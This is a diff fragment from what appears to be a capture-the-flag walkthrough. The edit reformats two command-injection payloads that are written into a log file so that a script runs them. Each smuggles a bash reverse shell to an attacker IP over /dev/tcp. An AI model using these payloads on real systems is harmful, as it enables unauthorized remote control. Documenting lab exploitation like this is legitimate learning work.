@@ -56,7 +56,9 @@ Let us put a reverse shell in to hackers
 
 `echo 'x x $(bash -c "bash -i &>/dev/tcp/10.10.x.x/7777 0>&1")' > /home/kid/logs/hackers`
 or 
-`a b ;bash -c "bash -i &>/dev/tcp/10.10.16.37/8821 0>&1" #'
+```
+a b ;bash -c "bash -i &>/dev/tcp/10.10.16.37/8821 0>&1" #
+```
 comment commands after payload
 
 The script will run
